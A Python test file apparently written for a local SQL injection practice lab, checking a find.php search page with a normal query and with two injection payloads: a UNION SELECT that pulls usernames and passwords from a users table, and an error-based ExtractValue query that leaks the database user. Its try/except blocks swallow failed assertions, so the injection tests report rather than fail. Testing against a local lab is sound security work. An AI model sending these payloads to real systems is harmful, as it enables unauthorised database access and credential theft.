import pytest
import requests

##this is the testing functions for the find.php file ##

def test_correct_functionality(base_url):
    search= "apple"
    url = base_url+"/find.php?search="+search
   
    response = requests.get(url)
    print(response.text)
    try:
        assert response.status_code == 200 and search.capitalize() in response.text
        print("functionality worked and the item was found")
        pass
    except :        
        assert "Trying to access array offset" in response.text
        print ("Item was not found")
        pass
    
def test_union_based_injection(base_url):
    search="' UNION SELECT username, password FROM users-- -"
    #search1="' UNION SELECT CONCAT(username, '~', password) FROM users-- -"
    url= base_url+"/find.php?search="+search
    response= requests.get(url)
    print(response.text) 
    try: 
     assert response.status_code ==200 and "admin" in response.text
     print("Union-Based test passed")
    except AssertionError:
        print("Union-Based injection failed")
    #print(response.status_code) 
   
  ########## Error Based Injection Testing #############

def test_error_based_injection(base_url):
    search="1 AND ExtractValue(0,CONCAT(0x5c,USER())) -- -"
    url= base_url+"/find.php?search="+search
    response = requests.get(url)
    print(response.text)
    try:
        assert response.status_code == 200 and 'root@localhost' in response.text
        print("Error-Based injection passed")
    
    except AssertionError:
        print("Error-Based injection failed")
     


base_url= "http://localhost:4000/sqli"

test_correct_functionality(base_url)
test_union_based_injection(base_url)
test_error_based_injection(base_url)